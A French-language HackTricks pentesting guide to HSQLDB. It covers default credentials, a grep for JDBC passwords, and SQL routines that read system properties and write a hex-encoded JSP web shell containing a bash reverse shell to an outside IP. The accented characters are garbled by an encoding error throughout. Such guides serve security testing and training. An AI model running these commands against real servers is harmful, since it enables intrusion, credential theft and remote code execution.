{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Informations de base

**HSQLDB \([HyperSQL DataBase](http://hsqldb.org/)\)** est le principal syst√®me de base de donn√©es relationnelle SQL √©crit en Java. Il offre un moteur de base de donn√©es multithread√© et transactionnel, rapide et l√©ger, avec des tables en m√©moire et sur disque, et prend en charge les modes embarqu√© et serveur.

**Port par d√©faut :** 9001
```text
9001/tcp open  jdbc      HSQLDB JDBC (Network Compatibility Version 2.3.4.0)
```
# Information

### Param√®tres par d√©faut

Notez qu'en r√®gle g√©n√©rale, ce service fonctionne probablement en m√©moire ou est li√© √† localhost. Si vous l'avez trouv√©, vous avez probablement exploit√© un autre service et cherchez √† √©lever vos privil√®ges.

Les identifiants par d√©faut sont g√©n√©ralement `sa` avec un mot de passe vide.

Si vous avez exploit√© un autre service, recherchez des identifiants possibles en utilisant
```text
grep -rP 'jdbc:hsqldb.*password.*' /path/to/search
```
Notez soigneusement le nom de la base de donn√©es - vous en aurez besoin pour vous connecter.

# Info Gathering

Connectez-vous √† l'instance de la base de donn√©es en [t√©l√©chargeant HSQLDB](https://sourceforge.net/projects/hsqldb/files/) et en extrayant `hsqldb/lib/hsqldb.jar`. Ex√©cutez l'application GUI \(eww\) en utilisant `java -jar hsqldb.jar` et connectez-vous √† l'instance en utilisant les identifiants d√©couverts/faibles.

Notez que l'URL de connexion ressemblera √† ceci pour un syst√®me distant : `jdbc:hsqldb:hsql://ip/DBNAME`.

# Tricks

## Java Language Routines

Nous pouvons appeler des m√©thodes statiques d'une classe Java depuis HSQLDB en utilisant des Java Language Routines. Notez que la classe appel√©e doit √™tre dans le classpath de l'application.

Les JRT peuvent √™tre des `functions` ou des `procedures`. Les fonctions peuvent √™tre appel√©es via des instructions SQL si la m√©thode Java retourne une ou plusieurs variables primitives compatibles SQL. Elles sont invoqu√©es en utilisant l'instruction `VALUES`.

Si la m√©thode Java que nous voulons appeler retourne void, nous devons utiliser une proc√©dure invoqu√©e avec l'instruction `CALL`.

## Reading Java System Properties

Cr√©er une fonction :
```text
CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
Ex√©cuter la fonction :
```text
VALUES(getsystemproperty('user.name'))
```
Vous pouvez trouver une [liste des propri√©t√©s syst√®me ici](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html).

## √âcrire du contenu dans un fichier

Vous pouvez utiliser le `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` gadget Java situ√© dans le JDK \(charg√© automatiquement dans le chemin de classe de l'application\) pour √©crire des √©l√©ments encod√©s en hexad√©cimal sur le disque via une proc√©dure personnalis√©e. **Notez la taille maximale de 1024 octets**.

Cr√©er une proc√©dure :
```text
CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))
LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```
Ex√©cuter la proc√©dure :
```text
call writetofile('/path/ROOT/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3131392[...]' AS VARBINARY(1024)))
```
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
